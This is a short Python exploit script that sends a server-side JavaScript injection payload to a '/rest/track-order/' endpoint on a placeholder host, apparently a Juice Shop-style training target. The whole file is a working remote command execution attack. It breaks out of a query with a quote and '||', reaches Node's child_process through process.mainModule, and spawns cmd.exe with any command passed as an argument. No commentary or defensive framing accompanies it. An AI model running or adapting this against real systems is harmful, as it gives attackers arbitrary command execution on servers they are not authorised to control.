#!/usr/bin/python3
import sys
import requests
import urllib

# Check if the command argument is provided
if len(sys.argv) != 2:
    print("Usage: python3 script.py <command>")
    sys.exit(1)

command_arg = sys.argv[1]

HOST = 'http://<HOST>:3000'

command = f"""
if (typeof global.hasRun === 'undefined' || global.hasRun === false) {{
    global.hasRun = true;
    var require = this.process.mainModule.require;
    const {{ spawn }} = require('node:child_process');
    const test = spawn('cmd.exe', ['/c', '{command_arg}']); // Try msg %username% hello
    
    test.on('exit', (code) => {{
        global.hasRun = false; // Reset hasRun when the process exits
    }});

    test.on('error', (err) => {{
        global.hasRun = false; // Reset hasRun if there is an error
    }});
}}
"""

payload = f"' || (function() {{ {command} }})(); //"

encoded = urllib.parse.quote(payload, safe='')
r = requests.get(HOST + "/rest/track-order/" + encoded)
